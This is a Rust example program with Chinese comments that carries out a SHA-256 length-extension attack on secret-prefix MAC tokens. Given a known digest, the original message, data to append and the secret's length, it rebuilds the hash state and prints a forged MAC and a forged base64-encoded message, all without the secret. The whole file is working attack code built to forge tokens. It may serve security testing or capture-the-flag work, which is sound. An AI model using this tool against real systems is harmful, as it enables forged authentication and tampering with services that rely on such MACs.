//! SHA-256 长度扩展攻击工具 —— 针对 `token = b64(msg) . sha256(secret‖msg)` 这类
//! 「密钥前缀 MAC」。在**不知道 secret**的情况下,由已知 `(msg, sha256(secret‖msg))` 续算出
//! `sha256(secret‖msg‖glue_pad‖append)`,并给出对应的新消息字节,从而伪造任意 append 的合法 MAC。
//!
//! 用法:
//! ```text
//! cargo run -p scry_proxy --example hashext -- <orig_hex_digest> <orig_msg> <append> <keylen>
//! ```
//! 输出(两行):
//! - `NEWSIG=<hex>`            新 MAC
//! - `NEWMSG_B64URL=<...>`     新消息 base64url(msg‖glue_pad‖append)(无 padding)

const H0: [u32; 8] = [
    0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a, 0x510e527f, 0x9b05688c, 0x1f83d9ab, 0x5be0cd19,
];

const K: [u32; 64] = [
    0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
    0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
    0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
    0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
    0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
    0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
    0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
    0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2,
];

fn compress(state: &mut [u32; 8], block: &[u8]) {
    let mut w = [0u32; 64];
    for (i, word) in w.iter_mut().take(16).enumerate() {
        *word = u32::from_be_bytes([
            block[4 * i],
            block[4 * i + 1],
            block[4 * i + 2],
            block[4 * i + 3],
        ]);
    }
    for i in 16..64 {
        let s0 = w[i - 15].rotate_right(7) ^ w[i - 15].rotate_right(18) ^ (w[i - 15] >> 3);
        let s1 = w[i - 2].rotate_right(17) ^ w[i - 2].rotate_right(19) ^ (w[i - 2] >> 10);
        w[i] = w[i - 16]
            .wrapping_add(s0)
            .wrapping_add(w[i - 7])
            .wrapping_add(s1);
    }
    let (mut a, mut b, mut c, mut d, mut e, mut f, mut g, mut h) = (
        state[0], state[1], state[2], state[3], state[4], state[5], state[6], state[7],
    );
    for i in 0..64 {
        let big_s1 = e.rotate_right(6) ^ e.rotate_right(11) ^ e.rotate_right(25);
        let ch = (e & f) ^ ((!e) & g);
        let t1 = h
            .wrapping_add(big_s1)
            .wrapping_add(ch)
            .wrapping_add(K[i])
            .wrapping_add(w[i]);
        let big_s0 = a.rotate_right(2) ^ a.rotate_right(13) ^ a.rotate_right(22);
        let maj = (a & b) ^ (a & c) ^ (b & c);
        let t2 = big_s0.wrapping_add(maj);
        h = g;
        g = f;
        f = e;
        e = d.wrapping_add(t1);
        d = c;
        c = b;
        b = a;
        a = t1.wrapping_add(t2);
    }
    state[0] = state[0].wrapping_add(a);
    state[1] = state[1].wrapping_add(b);
    state[2] = state[2].wrapping_add(c);
    state[3] = state[3].wrapping_add(d);
    state[4] = state[4].wrapping_add(e);
    state[5] = state[5].wrapping_add(f);
    state[6] = state[6].wrapping_add(g);
    state[7] = state[7].wrapping_add(h);
}

/// 对一条「总长度 = msg_len 字节」的消息,计算其 MD 填充字节(0x80 + zeros + 64bit 大端位长)。
fn md_padding(msg_len: usize) -> Vec<u8> {
    let bit_len = (msg_len as u64).wrapping_mul(8);
    let mut pad = vec![0x80u8];
    while (msg_len + pad.len()) % 64 != 56 {
        pad.push(0);
    }
    pad.extend_from_slice(&bit_len.to_be_bytes());
    pad
}

/// 普通 SHA-256(自测用)。
#[allow(dead_code)]
fn sha256(data: &[u8]) -> String {
    let mut state = H0;
    let mut buf = data.to_vec();
    buf.extend_from_slice(&md_padding(data.len()));
    for block in buf.chunks(64) {
        compress(&mut state, block);
    }
    state.iter().map(|w| format!("{w:08x}")).collect()
}

// 标准 base64 字母表(原 token 的 msg 段是标准 base64 去 padding,故这里用 +/)。
const B64URL: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

fn b64url_encode(data: &[u8]) -> String {
    let mut out = String::new();
    for chunk in data.chunks(3) {
        let b0 = chunk[0];
        let b1 = *chunk.get(1).unwrap_or(&0);
        let b2 = *chunk.get(2).unwrap_or(&0);
        let n = ((b0 as u32) << 16) | ((b1 as u32) << 8) | (b2 as u32);
        out.push(B64URL[((n >> 18) & 63) as usize] as char);
        out.push(B64URL[((n >> 12) & 63) as usize] as char);
        if chunk.len() > 1 {
            out.push(B64URL[((n >> 6) & 63) as usize] as char);
        }
        if chunk.len() > 2 {
            out.push(B64URL[(n & 63) as usize] as char);
        }
    }
    out
}

fn main() {
    let args: Vec<String> = std::env::args().skip(1).collect();
    if args.first().map(String::as_str) == Some("sha256") {
        println!("{}", sha256(args[1].as_bytes()));
        return;
    }
    if args.len() < 4 {
        eprintln!("用法: hashext <orig_hex_digest> <orig_msg> <append> <keylen>");
        std::process::exit(2);
    }
    let orig_hex = &args[0];
    let orig_msg = args[1].as_bytes();
    let append = args[2].as_bytes();
    let keylen: usize = args[3].parse().expect("keylen 必须是数字");

    // 1. 从已知摘要恢复 SHA-256 内部 8 字状态。
    let mut state = [0u32; 8];
    for (i, s) in state.iter_mut().enumerate() {
        *s = u32::from_str_radix(&orig_hex[i * 8..i * 8 + 8], 16).expect("非法 hex digest");
    }

    // 2. secret‖msg 的总长与其 MD 填充(= glue padding)。
    let orig_total = keylen + orig_msg.len();
    let glue = md_padding(orig_total);
    let already = orig_total + glue.len(); // 必为 64 的倍数(state 即此刻的中间态)

    // 3. 从恢复的 state 继续吸收 append,并补上以 (already+append) 为总长的最终填充。
    let final_total = already + append.len();
    let mut tail = Vec::new();
    tail.extend_from_slice(append);
    tail.extend_from_slice(&md_padding(final_total));
    for block in tail.chunks(64) {
        compress(&mut state, block);
    }
    let new_sig: String = state.iter().map(|w| format!("{w:08x}")).collect();

    // 4. 服务端要验证的新消息字节 = msg‖glue‖append(secret 由它自己前置)。
    let mut new_msg = Vec::new();
    new_msg.extend_from_slice(orig_msg);
    new_msg.extend_from_slice(&glue);
    new_msg.extend_from_slice(append);

    println!("NEWSIG={new_sig}");
    println!("NEWMSG_B64URL={}", b64url_encode(&new_msg));
}
